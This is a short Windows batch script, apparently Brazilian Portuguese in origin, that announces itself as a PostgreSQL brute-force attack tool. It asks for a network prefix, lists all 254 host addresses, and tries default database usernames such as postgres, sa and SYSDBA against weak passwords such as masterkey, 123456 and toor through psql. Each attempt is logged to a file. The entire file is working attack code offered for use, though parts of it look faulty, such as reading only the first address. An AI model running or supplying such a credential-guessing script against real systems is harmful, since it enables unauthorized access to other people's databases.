@echo off
echo ##########################################
echo # psql - Brute force Atack .bat (by jj) #
echo ##########################################

color 2e
set /p ip= echo "Entre com as 3 primeiras partes do seu Endereco IP[Interno ou Externo] Ex: 192.168.0 : "

for /L %%x in (1,1,254) do (echo %ip%.%%x >> listIPs.txt)

set /p list=<listIPs.txt
set user=postgres root admin SYSDBA sa user 
set pass=admin masterkey 123 1234 12345 123456 456123 123456789 sa toor

echo SELECT version() > comando.sql

echo iniciando...

for %%a in (%list%) do (
 for %%u in (%user%) do (
  for %%p in (%pass%) do (
    echo [%%a]  [%%u] [%%p]
    echo ####[IP: %%a - USUARIO: %%u - SENHA: %%p ]#### >> log.txt
    call psql -h %%a -U %%u password=%%p < comando.sql >> log.txt
    call psql -h %%a -U %%u password=%%p < comando.sql >> log.txt

))) 
@echo on
echo fim...
pause





